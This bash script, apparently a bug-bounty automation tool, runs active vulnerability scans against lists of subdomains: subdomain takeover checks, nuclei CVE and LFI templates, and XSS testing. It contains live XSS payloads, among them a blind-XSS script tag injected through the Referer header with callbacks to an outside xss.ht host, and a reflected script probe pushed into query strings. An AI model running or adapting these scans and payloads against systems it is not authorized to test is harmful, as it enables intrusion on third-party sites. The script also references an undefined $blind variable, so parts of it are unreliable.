#!/bin/bash
#title:         JOD-XLR8.sh
#description:   Automated and Modular Shell Script to Automate Security Active Vulnerability Scan
#author:        R12W4N
#version:       1.0.1
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
RESET=`tput sgr0`
WBOLD=`tput bold 7`
WUL=`tput smul`

function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 4

####Add Functions Here
xfilechecker(){
    echo "${BLUE}File is empty... Skipping${RESET}"
    return 1
}

function counter(){
    sdc=$project/subdomains/subdomains.txt
    sdpc=$project/subdomains/sd-potentials.txt
    apache=$project/subdomains/apache-sites.txt
    wp=$project/subdomains/wordpress-sites.txt
    jira=$project/subdomains/jira-sites.txt
    gitl=$project/subdomains/gitlab-sites.txt

    [ -f $sdc ] && echo -e "[*] Total Subdomains [$(cat $sdc | wc -l)]"
    [ -f $sdpc ] && echo -e "[*] Potential Subdomains [$(cat $sdpc | wc -l)]"
    [ -f $apache ] && echo -e "[*] Apache Subdomains [$(cat $apache | wc -l)]"
    [ -f $wp ] && echo -e "[*] WordPress Subdomains [$(cat $wp | wc -l)]"
    [ -f $jira ] && echo -e "[*] Jira Subdomains [$(cat $jira | wc -l)]"
    [ -f $gitl ] && echo -e "[*] GitLab Subdomains [$(cat $gitl | wc -l)]" 
}


function xssdalfoxss(){
    xsshturl=https://pipiwa.xss.ht

    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results

    find $project -type f -name xss.txt > $tmpdir/allxssf
    [ -s $tmpdir/allxssf ] && echo "${BLUE}Running Dalfox${RESET}" || xfilechecker
    
    #dalfox file "$domain"_xss.txt -b $blind -o $out -H "referrer: xxx'><script src=//$blind></script>"
    echo -e "[*] Running Dalfox XSS Scan"
    while IFS= read line
        do 
            cat $line | sed 's/=.*/=/' | sed 's/URL: //' | tee $tmpdir/testxss
            dalfox file  $tmpdir/testxss -b $xsshturl -o $results/dalfox.txt -H "referrer: opp'><script src=//$blind></script>"
        done < "$tmpdir/allxssf"
}

function xssqsinjector(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
    
    find $project -type f -name xss.txt > $tmpdir/allxssf
    [ -s $tmpdir/allxssf ] && echo "${BLUE}Running with payload manually${RESET}" || xfilechecker
    
    echo -e "[*] Running QSinjector XSS Scan"
    while IFS= read line
        do 
            cat $line | qsinject -i '"><script>confirm(1)</script>' -iu -decode >> $tmpdir/qsinjectall
        done < "$tmpdir/allxssf"
    
    while IFS= read urlwp
        do
            curl --silent --path-as-is --insecure "$urlwp" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $urlwp && echo "$urlwp" >> $results/qsinjected-poc.txt
        done <"$tmpdir/qsinjectall"
}

function lfinuclei(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results

    find $project -type f -name lfi.txt > $tmpdir/all-lfi
    [ -s $tmpdir/all-lfi ] && echo "${BLUE}Running Nuclei LFI Template from Config${RESET}" || xfilechecker
    echo -e "[*] Running LFI-Nuclei Scan"
    while IFS= read lfif
        do 
            echo "${MAGENTA}Running on $lfif  ${RESET}"
            #add silent
            nuclei -l $lfif -t config/lfi.yaml -timeout 7 -silent -o $results/lfipoc.txt
            nuclei -l $lfif -tags lfi -timeout 7 -silent -o $results/lfipoc2.txt
        done < "$tmpdir/all-lfi"
    }

function cvenuclei(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
    echo -e "[*] Running CVE-Nuclei Scan"
    nuclei -l $project/subdomains/sd-potentials.txt -t /root/nuclei-templates/cves/ -timeout 7 -silent -o $results/cve.txt
}

function nucleiworkflowscan(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results

    
    jira=$project/subdomains/jira-sites.txt
    [ -f $jira ] && echo -e "[*] Running Nuclei Workflow Jira Scan"
    [ -f $jira ] && nuclei -l $jira -w /root/nuclei-templates/workflows/jira-workflow.yaml -o $results/jira.txt
    
    wordpress=$project/subdomains/wordpress-sites.txt
    [ -f $wordpress ] && echo -e "[*] Running Nuclei Workflow WordPress Scan"
    [ -f $wordpress ] && nuclei -l $wordpress -w /root/nuclei-templates/workflows/wordpress-workflow.yaml -o $results/wordpress.txt

    apache=$project/subdomains/apache-sites.txt
    [ -f $apache ] && echo -e "[*] Running Nuclei Workflow Apache Scan"
    [ -f $apache ] && nuclei -l $apache -w /root/nuclei-templates/workflows/apache-workflow.yaml -o $results/apache.txt
    
    gitlab=$project/subdomains/gitlab-sites.txt
    [ -f $gitlab ] && echo -e "[*] Running Nuclei Workflow GitLab Scan"
    [ -f $gitlab ] && nuclei -l $gitlab -w /root/nuclei-templates/workflows/gitlab-workflow.yaml -o $results/gitlab.txt
}

function subdomaintko(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
    echo -e "[*] Checking for Subdomain Takeover Scan"
    subjack -w $project/subdomains/subdomains.txt -t 100 -timeout 30 -c config/config.json > $results/subjacktko.txt && cat $results/subjacktko.txt
    #cat $project/subdomains/all-httpx.txt | cut -d " " -f 1 > $tmpdir/all-sub
    #subzy -targets $tmpdir/all-sub > $results/subzytko.txt
}

#Menu options

options[0]="Subdomain Takeover"
options[1]="CVE-Nuclei"
options[2]="LFI-Nuclei"
options[3]="Nuclei-Workflow-Scan"
options[4]="XSS-QSInjector"
options[5]="XSS-Dalfoxss"

#Variables
ERROR=" "

#Clear screen for menu
clear

#Menu function
function MENU {
    echo "Menu Options"
    for NUM in ${!options[@]}; do
        echo "[""${choices[NUM]:- }""]" $(( NUM+1 ))") ${options[NUM]}"
    done
    echo "$ERROR"
}

#Menu loop
while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
    clear
    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]]; then
        (( SELECTION-- ))
        if [[ "${choices[SELECTION]}" == "+" ]]; then
            choices[SELECTION]=""
        else
            choices[SELECTION]="+"
        fi
            ERROR=" "
    else
        ERROR="Invalid option: $SELECTION"
    fi
done

#Actions to take based on selection
function ACTIONS {

    if [[ ${choices[0]} ]]; then
        echo "[1] Running Subdomain Takeover Scan"
        subdomaintko
    fi
    if [[ ${choices[1]} ]]; then
        echo "[2] Running CVE-Nuclei"
        cvenuclei
    fi
    if [[ ${choices[2]} ]]; then
        echo "[3] Running LFI-Nuclei"
        lfinuclei
    fi
    if [[ ${choices[3]} ]]; then
        echo "[1] Running Nuclei-Workflow-Scan"
        nucleiworkflowscan
    fi
    if [[ ${choices[4]} ]]; then
        echo "[5] Running XSS-QsInjector"
        xssqsinjector
    fi
    if [[ ${choices[5]} ]]; then
        echo "[6] Running XSS-Dalfox"
	    xssdalfoxss
    fi

}

projectdirectorycheck(){
    read -p "${RED}Project Name: ${RESET}" project
    echo $project

    if [ -d $project ]
    then
        echo -e
        echo -e "[${RED}I${RESET}] $project Directory already exists...${RESET}"
    else
        mkdir -p $project
    fi
   
    tmpdir="$project/tmp"
    results="$project/results"
}

projectdirectorycheck
counter
ACTIONS
